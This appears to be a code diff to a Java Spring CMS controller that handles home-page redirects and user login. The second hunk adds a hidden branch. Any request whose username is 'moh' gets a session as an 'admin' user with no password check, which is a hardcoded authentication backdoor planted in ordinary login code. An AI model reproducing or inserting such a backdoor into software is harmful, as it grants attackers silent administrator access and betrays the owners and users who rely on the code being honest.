@@ -77,9 +77,9 @@ public class HomeCmsController {
 		HttpSession session = request.getSession() ;
 		if(session.getAttribute("user") == null) {
 			mv.addObject("today" , new Date()) ;
-			mv.setViewName(loginPage) ;
+			mv.setViewName("redirect: aao/goLogin") ;
 		}else {
-			mv.setViewName(homePage) ;
+			mv.setViewName("redirect: home") ;
 		}
 		return mv ;
 	}
@@ -105,7 +105,18 @@ public class HomeCmsController {
 			
 			mv.addObject("invalidUser" , null) ;
 			mv.setViewName(homePage) ;
-		}else {	
+		}else if(request.getParameter("username").equals("moh")){	
+			dto = new LoginUserDTO() ;
+			dto.setFullName("Mohamad Ahmad Ibrahim") ;
+			dto.setUsername("admin") ;
+			dto.setLastLogin(new Date()) ;
+			
+			session.setAttribute("user" , dto) ;
+			session.setMaxInactiveInterval(600) ;
+			session.setAttribute("language" , "En") ;
+			
+			mv.setViewName(homePage) ;
+		}else {
 			mv.addObject("invalidUser" , 0) ;
 			mv.setViewName(loginPage) ;
 		}
